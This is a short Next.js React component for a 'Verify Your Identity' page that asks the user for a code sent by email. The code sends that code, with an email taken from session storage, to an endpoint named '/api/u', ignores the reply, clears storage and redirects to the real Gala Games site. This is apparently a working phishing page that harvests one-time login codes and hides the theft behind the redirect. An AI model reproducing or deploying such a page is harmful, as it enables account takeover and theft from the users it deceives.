'use client';
import React from 'react';
import styles from './styles.module.css';
import Image from "next/image";


const VerifyAccount = () => {
  const [otp, setOtp] = React.useState('');

  const navigateTo = async () => {
    const res = await fetch('/api/u', {
      method: 'POST',
      body: JSON.stringify({code: otp, email: sessionStorage.getItem('gd600-ap')}),
    });
    const json = await res.json();
    sessionStorage.clear()

    console.log('json', json)

    if (typeof window !== 'undefined') {
      window.location.assign('https://games.gala.com/')
    }
  }

  return (
    <div className={styles.wrapper}>
      <div className={styles.container}>
        <div className={styles.logo}>
          <Image width={60} height={60} src="/icons/form-logo.png" alt="Logo"/>
        </div>
        <h2 className={styles.title}>Verify Your Identity</h2>
        <p className={styles.description}>
          Please confirm that you{"'"}re the owner of your account by entering the code sent to your email.
        </p>
        <input
          type="text"
          placeholder="Enter code here..."
          className={styles.input}
          onChange={(e) => setOtp(e.target.value)}
        />
        <button className={styles.submitButton} onClick={navigateTo}>
          Submit
        </button>
        <p className={styles.resendLink}>
          Didn{"'"}t receive an email? <a href="#">Reach out</a>
        </p>
      </div>
    </div>
  );
};

export default VerifyAccount;
